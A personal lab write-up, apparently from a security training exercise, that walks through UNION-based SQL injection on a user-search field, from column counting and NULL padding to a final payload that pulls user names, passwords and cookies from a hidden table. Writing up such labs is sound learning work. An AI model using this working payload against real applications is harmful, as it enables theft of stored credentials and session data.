## Objective

This lab focused on exploiting a vulnerable SQL query to retrieve sensitive information from another database table using **UNION-based SQL Injection**. The exercise demonstrated how attackers manipulate SQL query structures to extract hidden credentials from unrelated tables.
# Lab Overview

The application allowed searching users by their last name through an input field vulnerable to SQL Injection.

The primary table exposed to the application was:

```
user_data
```

![[Pasted image 20260523154341.png]]

During reconnaissance, another hidden table was identified:

```
user_system_data
```

![[Pasted image 20260523154508.png]]

# Step 1 — Understanding the Vulnerability

The application likely generated a query similar to:

```
SELECT * FROM user_dataWHERE last_name = '$input'
```

![[Pasted image 20260523154807.png]]

Because user input was directly concatenated into the SQL statement without sanitization or parameterized queries, the application became vulnerable to SQL Injection.

# Step 2 — Breaking Out of the SQL String

The first step in exploitation involved closing the original SQL string using:

```
'
```

This allowed control over the remainder of the SQL query.
# Step 3 — Using UNION SELECT

The `UNION` operator was used to combine results from the legitimate query with attacker-controlled results from another table.

Initial payload structure:

```
' UNION SELECT ...
```
# Step 4 — Identifying Column Count Requirements

The original table (`user_data`) contained **7 columns**, meaning the injected `UNION SELECT` statement also needed to return exactly 7 columns.

### Original Table Columns

|Column|
|---|
|userid|
|first_name|
|last_name|
|cc_number|
|cc_type|
|cookie|
|login_count|
# Step 5 — Matching Columns Using NULL Padding

The hidden table (`user_system_data`) only contained 4 useful columns:

|Column|
|---|
|userid|
|user_name|
|password|
|cookie|

To satisfy the UNION requirement, the remaining columns were padded using `NULL` values.
# Step 6 — Constructing the Final Payload

Final working payload:

```
' UNION SELECT userid,user_name,password,cookie,NULL,NULL,NULL FROM user_system_data--
```

![[Pasted image 20260523154928.png]]
# Step 7 — Understanding the Payload

### Query Breakdown

| Component                          | Purpose                           |
| ---------------------------------- | --------------------------------- |
| `'`                                | Closes original SQL string        |
| `UNION SELECT`                     | Appends attacker-controlled query |
| `userid,user_name,password,cookie` | Extracts sensitive data           |
| `NULL,NULL,NULL`                   | Pads remaining required columns   |
| `FROM user_system_data`            | Targets hidden table              |
| `--`                               | Comments out remaining SQL        |
# Step 8 — Successful Data Extraction

The payload successfully returned records from the hidden table:

![[Pasted image 20260523155028.png]]

Dave’s password was successfully identified as: passW0rD
![[Pasted image 20260523155314.png]]
